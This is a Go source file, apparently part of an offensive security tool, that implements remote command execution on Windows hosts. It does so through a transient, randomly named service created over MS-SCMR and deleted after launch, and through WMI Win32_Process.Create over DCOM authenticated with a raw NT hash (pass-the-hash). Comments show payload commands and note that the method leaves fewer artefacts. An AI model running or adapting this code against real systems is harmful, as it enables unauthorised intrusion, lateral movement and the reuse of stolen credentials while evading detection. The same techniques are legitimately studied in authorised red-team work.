// Package remoteexec implements remote command execution primitives:
// transient Windows service via MS-SCMR and WMI Win32_Process.Create via DCOM.
package remoteexec

import (
	"fmt"
	"math/rand"
	"os"
	"strings"

	"github.com/jfjallid/go-smb/dcerpc"
	"github.com/jfjallid/go-smb/dcerpc/msdcom"
	"github.com/jfjallid/go-smb/dcerpc/msscmr"
	"github.com/jfjallid/go-smb/dcerpc/smbtransport"
	"github.com/jfjallid/go-smb/gss"
	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/spnego"
)

const letters = "abcdefghijklmnopqrstuvwxyz"

func randName(n int) string {
	b := make([]byte, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}

// ExecViaService executes a command on the remote host by creating a transient
// Windows service via MS-SCMR (T1569.002). The service is deleted after launch.
//
// command should be a full binary path, optionally wrapped in cmd.exe:
//
//	"%COMSPEC% /c whoami > C:\Windows\Temp\out.txt"
//	"C:\Windows\Temp\payload.exe"
func ExecViaService(session *smb.Connection, command string) error {
	if err := session.TreeConnect("IPC$"); err != nil {
		return fmt.Errorf("TreeConnect IPC$: %w", err)
	}
	defer session.TreeDisconnect("IPC$")

	pipe, err := session.OpenFile("IPC$", msscmr.MSRPCSvcCtlPipe)
	if err != nil {
		return fmt.Errorf("open svcctl pipe: %w", err)
	}
	defer pipe.CloseFile()

	transport, err := smbtransport.NewSMBTransport(pipe)
	if err != nil {
		return fmt.Errorf("SMB transport: %w", err)
	}

	bind, err := dcerpc.Bind(
		transport,
		msscmr.MSRPCUuidSvcCtl,
		msscmr.MSRPCSvcCtlMajorVersion,
		msscmr.MSRPCSvcCtlMinorVersion,
		dcerpc.MSRPCUuidNdr,
	)
	if err != nil {
		return fmt.Errorf("DCE/RPC bind svcctl: %w", err)
	}

	rpccon := msscmr.NewRPCCon(bind)
	svcName := randName(12)

	err = rpccon.CreateService(
		svcName,
		msscmr.ServiceWin32OwnProcess,
		msscmr.ServiceDemandStart,
		msscmr.ServiceErrorIgnore,
		command,
		"",
		"",
		"",
		false,
	)
	if err != nil {
		return fmt.Errorf("CreateService: %w", err)
	}

	fmt.Printf("[*] Service '%s' created, starting...\n", svcName)

	// ERROR_SERVICE_REQUEST_TIMEOUT (1053) is expected when the payload does
	// not call SetServiceStatus; the command still ran before SCM killed it.
	err = rpccon.StartService(svcName, nil)
	if err != nil {
		if strings.Contains(err.Error(), "timeout") {
			fmt.Printf("[!] Service start timed out (expected - command was dispatched)\n")
		} else {
			_ = rpccon.DeleteService(svcName)
			return fmt.Errorf("StartService: %w", err)
		}
	} else {
		fmt.Printf("[+] Service started successfully\n")
	}

	if err := rpccon.DeleteService(svcName); err != nil {
		fmt.Fprintf(os.Stderr, "[!] DeleteService '%s': %v (non-fatal)\n", svcName, err)
	} else {
		fmt.Printf("[+] Service '%s' deleted\n", svcName)
	}
	return nil
}

// ExecViaWMI executes a command on the remote host via WMI Win32_Process.Create
// (T1047). Unlike ExecViaService this does not create a Windows service and
// leaves less SCM artefacts. The spawned process runs under the authenticated
// caller's security context (e.g. TESTLAB\Administrator), not LocalSystem.
//
// hashBytes is the raw 16-byte NT hash (already decoded from hex).
func ExecViaWMI(target, domain, user string, hashBytes []byte, command string) error {
	opts := msdcom.DCOMOptions{
		MechFactory: func() gss.Mechanism {
			return &spnego.NTLMInitiator{
				User:   user,
				Domain: domain,
				Hash:   hashBytes,
			}
		},
		AuthLevel: dcerpc.RpcAuthnLevelPktPrivacy,
	}

	conn, err := msdcom.NewDCOMConnection(target, opts)
	if err != nil {
		return fmt.Errorf("DCOM connect to %s: %w", target, err)
	}
	defer conn.Close()

	wmi, err := msdcom.NewWMIClient(conn, `//./root/cimv2`)
	if err != nil {
		return fmt.Errorf("WMI NTLMLogin: %w", err)
	}
	defer wmi.Close()

	classDef, err := wmi.GetObject("Win32_Process")
	if err != nil {
		return fmt.Errorf("GetObject Win32_Process: %w", err)
	}

	inParams, err := msdcom.BuildMethodInput(classDef, "Create", map[string]msdcom.MethodParam{
		"CommandLine": msdcom.StringParam(command),
	})
	if err != nil {
		return fmt.Errorf("BuildMethodInput: %w", err)
	}

	outBlob, err := wmi.ExecMethod("Win32_Process", "Create", inParams)
	if err != nil {
		return fmt.Errorf("ExecMethod Win32_Process.Create: %w", err)
	}

	out, err := msdcom.ParseCIMInstanceAllValues(outBlob)
	if err != nil {
		// Non-fatal: command may still have been dispatched
		fmt.Printf("[!] ParseCIMInstanceAllValues: %v (may be non-fatal)\n", err)
	} else {
		if pid, ok := out["ProcessId"]; ok {
			fmt.Printf("[+] Process created, PID = %v\n", pid)
		}
		if rc, ok := out["ReturnValue"]; ok {
			fmt.Printf("[+] ReturnValue = %v\n", rc)
		}
	}
	return nil
}
